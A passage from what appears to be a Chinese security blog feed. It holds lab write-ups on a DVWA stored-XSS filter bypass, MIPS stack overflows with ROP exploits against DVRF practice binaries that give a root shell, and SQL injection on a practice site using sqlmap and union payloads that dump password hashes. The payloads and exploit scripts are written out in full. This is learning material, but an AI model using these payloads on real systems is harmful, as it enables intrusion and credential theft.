title="medium"></a>medium</h3><p>这就很尴尬了。。<br>原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码：</p><p>这里也是通过大小写或者双写就能绕过的</p><p><code>&lt;sCriPt&gt;alert(1)&lt;/script&gt;</code></p><p>找到了一个xss平台</p><p><a href="http://xssye.com/index.php?do=project&amp;act=view&amp;id=3761" target="_blank" rel="noopener">xss平台</a></p><p>但是我发现我不会用了。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA&quot;&gt;&lt;a href=&quot;#DVWA&quot; class=&quot;headerlink&quot; title=&quot;DVWA&quot;&gt;&lt;/a&gt;DVWA&lt;/h1&gt;&lt;p&gt;用的vulstudy的环境&lt;br&gt;默认用户名是&lt;code&gt;admin&lt;/code&gt;密码是&lt;code&gt;password&lt;/co
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
  </entry>
  
  <entry>
    <title>IOT 栈溢出笔记</title>
    <link href="https://prontosil.club/2019/07/20/IOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/20/IOT-栈溢出笔记/</id>
    <published>2019-07-20T01:04:36.000Z</published>
    <updated>2019-07-20T01:12:03.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MIPS栈溢出"><a href="#MIPS栈溢出" class="headerlink" title="MIPS栈溢出"></a>MIPS栈溢出</h1><h2 id="x86和MIPS指令集"><a href="#x86和MIPS指令集" class="headerlink" title="x86和MIPS指令集"></a>x86和MIPS指令集</h2><p>在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm</p><h3 id="MISP指令集存在栈溢出的原因"><a href="#MISP指令集存在栈溢出的原因" class="headerlink" title="MISP指令集存在栈溢出的原因"></a>MISP指令集存在栈溢出的原因</h3><p>叶子函数和非叶子函数</p><blockquote><p>叶子函数的返回地址是直接放在 ra 寄存器中，而非叶子函数需要调用另外的函数，这里的差异就照成了非叶子函数需要把当前的返回地址暂时存放在栈上</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>attifyOS虚拟机，基本内置了我需要的所有工具，当然其中的IDA似乎过期了，去吾爱破解上找了一个Linux版本的IDA安装了</p><p><a href="https://www.52pojie.cn/thread-450156-1-1.html" target="_blank" rel="noopener">吾爱破解链接</a></p><h2 id="MIPS动态调试"><a href="#MIPS动态调试" class="headerlink" title="MIPS动态调试"></a>MIPS动态调试</h2><p>使用<code>qemu-mipsel</code>或者<code>qemu-mipsel-static</code>进行调试，qemu支持使用gdb进行调试，-g选项开启一个端口，IDA可以连接上这个端口从而进行动态调试。之前在看雪的虚拟机上只能用<code>qemu-mipsel-static</code>调试，后来换成了<code>attifyOS</code>发现两者都行。不过如果缺少动态链接库的话还是需要<code>chroot</code>同时将相应的库拷贝过来。</p><h2 id="简单的栈溢出"><a href="#简单的栈溢出" class="headerlink" title="简单的栈溢出"></a>简单的栈溢出</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void has_stack(char *src)&#123;</span><br><span class="line">        char dst[20] = &#123;0&#125;;</span><br><span class="line">        strcpy(dst,src);</span><br><span class="line">        printf(&quot;copy success!n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main(int argc,char *argv[])&#123;</span><br><span class="line">        has_stack(argv[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用<code>mipsel-linux-gcc</code>进行编译</p><p><code>mipsel-linux-gcc ./stack01.c -o stack01 -static</code></p><p>编译之后得到：<br><code>root@ubuntu:~/stack# file stack01stack01: ELF 32-bit LSB  executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></p><p>使用IDA查看反汇编：</p><p>由于main函数中调用了其他的函数，所以main函数必然是非叶子函数，当然这里我们不是覆盖main函数的返回地址，因为<code>has_stack</code>函数也是非叶子函数，而且<code>strcpy</code>没有对长度做限制。</p><p><code>strcpy</code>的第一个参数dst存放在<code>$a0</code>中，第二个参数src存放在<code>$a1</code>中，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00400410                 sw      $zero, 0x38+var_10($fp)</span><br><span class="line">.text:00400414                 addiu   $v0, $fp, 0x38+var_20 #要拷贝到的地方</span><br><span class="line">.text:00400418                 move    $a0, $v0</span><br><span class="line">.text:0040041C                 lw      $a1, 0x38+arg_0($fp)  # 要拷贝的内容</span><br><span class="line">.text:00400420                 la      $v0, strcpy</span><br><span class="line">.text:00400424                 move    $t9, $v0</span><br><span class="line">.text:00400428                 jalr    $t9 ; strcpy</span><br><span class="line">.text:0040042C                 nop</span><br><span class="line">.text:00400430                 lw      $gp, 0x38+var_28($fp)</span><br></pre></td></tr></table></figure></p><p>偷懒一点不仔细分析栈了</p><p>使用<code>patternLocOffset.py</code>工具生成长度为30的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [4:31]</span><br><span class="line">&gt; python patternOffset.py -c -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[+] output to patternShell.txt ok!</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure></p><p>动态调试：<br><code>./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9</code></p><p>直接在调用函数返回的地方下断点，查看此时的<code>$ra</code>寄存器的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400450 move    $sp, $fp</span><br><span class="line">.text:00400454 lw      $ra, 0x38+var_4($sp)</span><br><span class="line">.text:00400458 lw      $fp, 0x38+var_8($sp)</span><br><span class="line">.text:0040045C addiu   $sp, 0x38</span><br><span class="line">.text:00400460 jr      $ra (断点)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/UsAmD68.png" alt="ra3"></p><p>计算需要<code>padding</code>的长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; python patternOffset.py -s 0x62413961 -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 28 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0008 s</span><br></pre></td></tr></table></figure></p><p>需要填充28个字节</p><p>最后的payload</p><blockquote><p>./qemu-mipsel-static -g 1234 ./stack01 `python -c “print ‘a’*28+’\x90\x03\x40\x00’”`</p></blockquote><p>此时成功地发生了跳转<br><img src="https://i.imgur.com/nAokUL0.png" alt="vuln"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/stack# ./qemu-mipsel-static  ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# ls</span><br><span class="line">core     qemu-mipsel-static  stack01    stack01.id0  stack01.idb  stack01.til</span><br><span class="line">qemu-mipsel  ret2txt.c stack01.c  stack01.id1  stack01.nam</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h2 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void do_system_0(int code,char *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[255];</span><br><span class="line">    //sleep(1);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[256]=&#123;0&#125;;</span><br><span class="line">    char ch;</span><br><span class="line">    int count = 0;</span><br><span class="line">    unsigned int fileLen = 0;</span><br><span class="line">    struct stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    if(0 == stat(&quot;passwd&quot;,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line"></span><br><span class="line">    if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Cannot open file passwd!n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    while(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = &apos;x00&apos;;</span><br><span class="line"></span><br><span class="line">    if(!strcmp(buf,&quot;adminpwd&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system_0(count,&quot;ls -l&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;you have an invalid password!n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处main函数明显是非叶子函数，我们要想办法调用<code>do_system_0</code>这个函数<br>那就要想办法控制<code>$a1</code>寄存器，那样就可以执行任何命令</p><p><code>mipsrop.stackfinder()</code><br>查找gadget<br><img src="https://i.imgur.com/FJpReqv.png" alt="mips_rop"></p><p>我们选择<br><code>0x00403660  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_4($sp)</code></p><p>要做到跳转到我们的<code>gadget</code>，需要覆盖main函数的返回地址</p><p>先计算要padding的长度</p><p>此时计算出来的pattern是412，会不会太长了点(注：在我参考的文章中作者计算出来的偏移和我的不一样，刚开始我以为是自己计算错了，但是后来调试后认为自己并没有算错)<br><img src="https://i.imgur.com/0Q1gHli.png" alt="rop0"></p><p>接下来我尝试先覆盖main函数的返回地址<br>跳转到rop的空间，再将<code>/bin/sh</code>字符串的地址赋值给<code>$a1</code></p><p><code>$ra</code>被覆盖<br><img src="https://i.imgur.com/28cvjLd.png" alt="rop1"></p><p>f7单步一次，跳转到<code>gadget</code><br>而且此时栈空间已经布置好了<br><code>addiu   $a1, $sp, 0x58+var_40</code>相当于 <code>$a1 = $sp+0x18</code></p><p>此时<code>$sp+0x18</code>存放的就是<code>/bin/sh</code>字符串的地址<br><img src="https://i.imgur.com/EewHvzW.png" alt="rop3"></p><p>然而不知道为什么<br>这个错误就很不明不白了<br><img src="https://i.imgur.com/sUi3w2O.png" alt="rop4"></p><p>重新回顾了一下《揭秘家用路由器0day漏洞挖掘技术》，看到了作者写的一个exp<br>将gadget的地址替换成我的，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">cmd = &quot;sh&quot;</span><br><span class="line"></span><br><span class="line">cmd += &quot;\x00&quot;*(4-len(cmd)%4)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;A&quot;*0x19c</span><br><span class="line">shellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadget地址，作者写的是&quot;&lt;L&quot;但是我尝试之后发现地址是反的，所以换过来了</span><br><span class="line">shellcode+=&quot;A&quot;*24</span><br><span class="line">shellcode+=cmd</span><br><span class="line">shellcode+=&quot;B&quot;*(0x3C-len(cmd))</span><br><span class="line">shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0函数地址</span><br><span class="line">shellcode+=&quot;BBBB&quot;</span><br><span class="line"></span><br><span class="line">print &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">print &quot;[+] create password file&quot;</span><br><span class="line">fw = open(&apos;passwd&apos;, &apos;w&apos;)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br><span class="line">print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p><p>生成<code>passwd</code>文件之后，<code>./qemu-mipsel-static -g 1234 ./vuln_system</code>进行调试<br>当程序跳转到<code>gadget</code>时，变成了这样，<br><img src="https://i.imgur.com/ibeZvb8.png" alt="rop5"></p><p>此时看终端：<br>我居然成功了？？此时已经拿到了root权限<br><img src="https://i.imgur.com/m1S8DHs.png" alt="rop6"></p><p>确实没有看错，重新运行一遍程序，确实拿到了shell权限<br><img src="https://i.imgur.com/VbXRlHO.png" alt="rop7"></p><h1 id="DVRF-练习"><a href="#DVRF-练习" class="headerlink" title="DVRF 练习"></a>DVRF 练习</h1><p>这个在attifyOS上已经下载好了，当然也可以去GitHub上clone一份，一个很不错的项目</p><p>来看Intro的<code>stack_bof_01</code><br>程序位于<code>/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/</code></p><p>源码位于<code>/home/oit/DVRF/Pwnable Source/Intro</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//Simple BoF by b1ack0wl for E1550</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv[])&#123;</span><br><span class="line">char buf[200] =&quot;\0&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);</span><br><span class="line">strcpy(buf, argv[1]);</span><br><span class="line"></span><br><span class="line">printf(&quot;You entered %s \r\n&quot;, buf);</span><br><span class="line">printf(&quot;Try Again\r\n&quot;);</span><br><span class="line"></span><br><span class="line">return 0x41; // Just so you can see what register is populated for return statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dat_shell()&#123;</span><br><span class="line">printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);</span><br><span class="line">system(&quot;/bin/sh -c&quot;);</span><br><span class="line"></span><br><span class="line">//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);</span><br><span class="line">//execve(&quot;/bin/sh&quot;, 0, 0);</span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>显然也是<code>strcpy</code>函数没有限制拷贝的长度</p><p>运行它：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01</span><br><span class="line">Usage: stack_bof_01 &lt;argument&gt;</span><br><span class="line">-By b1ack0wl</span><br></pre></td></tr></table></figure></p><p>我们直接计算偏移地址</p><p>生成长度为200的字符串</p><p><img src="https://i.imgur.com/rTQh75u.png" alt="stack0"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [5:50]</span><br><span class="line">&gt; python patternOffset.py -s 0x41386741 -l 200</span><br><span class="line">[*] Create pattern string contains 200 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 204 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0042 s</span><br></pre></td></tr></table></figure></p><p>那我们试一试直接填充</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; test</span><br><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234  ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot;</span><br></pre></td></tr></table></figure><p>此时已经将<code>$ra</code>寄存器的值覆盖掉了<br>但是<br><img src="https://i.imgur.com/iaNBx6x.png" alt="stack1"></p><p>在<code>dat_shell</code>函数中<br>报错了<br>所以这时候需要借助<code>gadget</code></p><p><img src="https://i.imgur.com/EIr3CJx.png" alt="error2"></p><p>之前参考了几篇文章，都是通过查找libc的基地址来确认<code>gadget</code>在内存中的地址的，但是我开始要gdb调试的时候并没有看到<code>libc.so.0</code>的加载，所以我一直怀疑是不是没加载，然后然后，看到原程序中是有puts和memset这些函数的，那显然是加载了的<br>于是下一个断点然后调试</p><p><img src="https://i.imgur.com/InVI4HI.png" alt="vmmap"></p><p>终于找到了libc的加载基址</p><p><img src="https://i.imgur.com/mIhckGP.png" alt="gadget"></p><p>这样就好办了<br><code>python -c &quot;print &#39;a&#39;*204+&#39;\x20\x1b\x8a\x40&#39;+&#39;\x50\x09\x40\x00&#39;&quot; &gt; test</code></p><p>之后运行</p><p>ok已经成功了！！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;</span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �@P@</span><br><span class="line">Try Again</span><br><span class="line">Congrats! I will now execute /bin/sh</span><br><span class="line">- b1ack0wl</span><br></pre></td></tr></table></figure></p><p>不过为啥用<code>mipsrop</code>找不到这个gadget呢？<br>很疑惑</p><p>确认libc基址的方法大概有：</p><ol><li>vmmap</li><li>cat /proc/pid/maps查看进程的内存分布</li><li>在IDA中查找到函数真正加载的位置，然后计算偏移</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/169689#h3-12" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（一）</a>(感觉这篇文章中第二个程序调试的不是很正确，因为偏移计算的都不一样)<br><a href="https://www.anquanke.com/post/id/171918#h2-0" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（二）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MIPS栈溢出&quot;&gt;&lt;a href=&quot;#MIPS栈溢出&quot; class=&quot;headerlink&quot; title=&quot;MIPS栈溢出&quot;&gt;&lt;/a&gt;MIPS栈溢出&lt;/h1&gt;&lt;h2 id=&quot;x86和MIPS指令集&quot;&gt;&lt;a href=&quot;#x86和MIPS指令集&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>两道sql注入题</title>
    <link href="https://prontosil.club/2019/07/15/%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
    <id>https://prontosil.club/2019/07/15/两道sql注入题/</id>
    <published>2019-07-15T01:16:49.000Z</published>
    <updated>2019-07-15T01:18:46.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于sql的盲注"><a href="#基于sql的盲注" class="headerlink" title="基于sql的盲注"></a>基于sql的盲注</h1><p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p><p>如果是针对post表单这种方式</p><ol><li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li><li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li><li>指定参数</li></ol><p>趁机学到了一把<code>sqlmap</code>使用<br>虽然这个题目是有点。。<br>但是注入点的判断也是很重要的</p><h2 id="爆后端数据库"><a href="#爆后端数据库" class="headerlink" title="爆后端数据库"></a>爆后端数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p><p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p><h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p><p><img src="https://i.imgur.com/JqIhPQS.png" alt="database"></p><h2 id="指定数据库报表爆表"><a href="#指定数据库报表爆表" class="headerlink" title="指定数据库报表爆表"></a>指定数据库报表爆表</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p><p><img src="https://i.imgur.com/qNL5qbg.png" alt="table"></p><h2 id="指定数据库和表爆字段"><a href="#指定数据库和表爆字段" class="headerlink" title="指定数据库和表爆字段"></a>指定数据库和表爆字段</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p><p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p><h2 id="指定数据库，表，字符然后dump出数据"><a href="#指定数据库，表，字符然后dump出数据" class="headerlink" title="指定数据库，表，字符然后dump出数据"></a>指定数据库，表，字符然后dump出数据</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code><br><img src="https://i.imgur.com/iRvoAHX.![password](https://i.imgur.com/B6oLiAA.png" alt="member"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p><p>解密之后是106370<br>这样就能登陆后台了<br><img src="https://i.imgur.com/6KXMijL.png" alt="houtai"><br><img src="https://i.imgur.com/yxq3qQi.png" alt="key0"><br>太神奇了</p><p>参考<br><a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)——POST登陆框注入实战</a></p><h1 id="SQL手工注入漏洞测试-Access数据库"><a href="#SQL手工注入漏洞测试-Access数据库" class="headerlink" title="SQL手工注入漏洞测试(Access数据库)"></a>SQL手工注入漏洞测试(Access数据库)</h1><p>这道题目就有点神奇了</p><p>纯靠猜</p><p><code>order by 4</code>判断有多少个字段</p><p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p><p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0"><br>接下来判断回显位置<br><code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p><p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1"><br>接下来猜测字段值<br><code>and exists (select id from admin)</code></p><p>爆出字段值<br><code>union select 1,username,passwd,id from admin</code><br><img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p><p>md5解密一下登陆就行了</p><p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基于sql的盲注&quot;&gt;&lt;a href=&quot;#基于sql的盲注&quot; class=&quot;headerlink&quot; title=&quot;基于sql的盲注&quot;&gt;&lt;/a&gt;基于sql的盲注&lt;/h1&gt;&lt;p&gt;之前一直没有好好地学习过&lt;code&gt;sqlmap&lt;/code&gt;的使用方法&lt;/p&gt;
&lt;p&gt;如果
      
    
    </summary>
    
      <category term="mozhe" scheme="https://prontosil.club/categories/mozhe/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode 2</title>
    <link href="https://prontosil.club/2019/07/15/Leetcode-2/"/>
    <id>https://prontosil.club/2019/07/15/Leetcode-2/</id>
    <published>2019-07-15T01:12:08.000Z</published>
    <updated>2019-07-20T01:13:21.250Z</updated>
    
